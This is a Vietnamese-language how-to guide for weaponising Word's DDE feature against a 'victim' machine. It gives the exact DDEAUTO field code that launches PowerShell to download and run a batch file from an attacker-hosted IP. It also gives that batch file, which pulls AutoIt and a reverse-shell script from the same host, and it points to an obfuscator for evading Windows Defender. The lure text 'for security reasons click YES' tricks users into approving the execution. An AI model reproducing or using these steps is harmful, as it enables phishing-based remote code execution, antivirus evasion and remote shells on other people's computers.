# Lạm dụng TÍNH NĂNG hợp pháp của Microsoft Word để thực thi mã độc bất hợp pháp
> Mô tả: Lạm dụng tính năng DDE - Dynamic Data Exchange của Office, cho phép ứng dụng Office tải dữ liệu từ các ứng dụng Office khác. Từ đó, thay vì chèn dữ liệu hợp pháp thì chèn dữ liệu độc hại. ***Ví dụ: file Word có thể cập nhật dữ liệu table bằng cách kéo dữ liệu từ tệp Excel mỗi khi tệp Word được mở.***

Như vậy, DDE có khả năng cho phép file Word mỗi khi được mở, có thể thực thi đoạn mã đang được lưu trữ trong một file khác và cho phép các ứng dụng đó có thể gửi bản cập nhật dữ liệu mới.

Dữ liệu độc hại được thực thi ở đây là 1 câu lệnh sẽ được hiện trên máy victim. Câu lệnh này sẽ tải 1 tập lệnh Batch được host trên máy attack về, và tự động thực thi trên máy victim. Tập lệnh Batch có chức năng giúp attacker tạo 1 reverse shell từ máy victim. Tập lệnh Batch sẽ được mã hóa để bypass hoàn toàn Windows Defender.

Lưu ý: DDE hoàn toàn là 1 TÍNH NĂNG, không phải là lỗ hổng. 

## Thực thi

1. Mở file Word lên, vào Insert -> Quick Parts -> Field…
2. Sẽ có 1 bảng hiện ra, tiến hành click double vào ” = (Formula ) ”
3. 1 dòng chữ sẽ hiện ra, chuột phải vào, chọn “Toggle Field Codes”
4. Thay đổi nội dung như sau: 
```console
{DDEAUTO "C:\\windows\\system32\\cmd.exe /k powershell -NoP -NonI -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('http://192.168.2.39:1113/RVSo.bat', 'RVSo.bat');start 'RVSo.bat' # " "for security reasons click YES"}
```
### Nội dung của file RVSo.bat
```bat
@echo

cd %temp%

curl http://192.168.2.39:1113/autoit/AutoIt3.exe > autoit.exe

curl http://192.168.2.39:1113/autoit/RVS.a3x > reverseShell.a3x
autoit.exe reverseShell.a3x
```
Dùng tool [này](https://github.com/thotrangyeuduoi/toolWin/blob/master/obfuscator.cmd) để mã hóa file RVS.bat nhằm bypass AntiVirus
```cmd
C:\User\Document\obfucator.cmd RVS.bat
```
### File liên quan

[ReverseShell.au3](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ReverseShell_by_Autoit.au3)

Ref: https://anonyviet.com/cach-hacker-bypass-av-xam-nhap-windows-voi-autoit/

https://anonyviet.com/phuong-phap-phat-tan-virus-bang-file-word/